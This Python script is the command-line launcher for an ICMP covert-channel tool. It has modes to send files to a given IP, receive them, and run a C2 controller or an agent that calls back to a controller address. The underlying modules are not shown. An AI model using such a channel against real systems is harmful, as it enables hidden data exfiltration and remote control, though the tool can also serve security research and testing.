import argparse
import sys

from lib.icmp_send import icmpSend
import lib.icmp_receive as icmp_receive
import lib.icmp_c2_controller as icmp_c2_controller
import lib.icmp_c2_agent as icmp_c2_agent

from scapy.all import sniff, IP, ICMP


def parseargs() -> argparse.Namespace:

    parser = argparse.ArgumentParser()

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-s", "--send", action="store_true", help="send a file")
    group.add_argument("-r", "--receive", action="store_true", help="receive files")
    group.add_argument(
        "-c", "--controller", action="store_true", help="run as a c2 controller"
    )
    group.add_argument("-a", "--agent", action="store_true", help="run as a c2 agent")
    parser.add_argument(
        "--dip",
        action="store",
        help="IP address of the receiver (only used when sending).",
        required=("-s" in sys.argv or "--send" in sys.argv),
    )
    parser.add_argument(
        "--file",
        action="store",
        help="file to send, including the path (only used when sending).",
        required=("-s" in sys.argv or "--send" in sys.argv),
    )
    parser.add_argument(
        "--cip",
        action="store",
        help="IP address of the controller (only used in agent mode).",
        required=("-a" in sys.argv or "--agent" in sys.argv),
    )

    return parser.parse_args()


def main(args: argparse.Namespace):

    if args.send:
        icmpSend(args.dip, args.file).start()
    elif args.receive:
        icmp_receive.listen()
    elif args.controller:
        icmp_c2_controller.start()
    elif args.agent:
        icmp_c2_agent.start(args.cip)


main(parseargs())
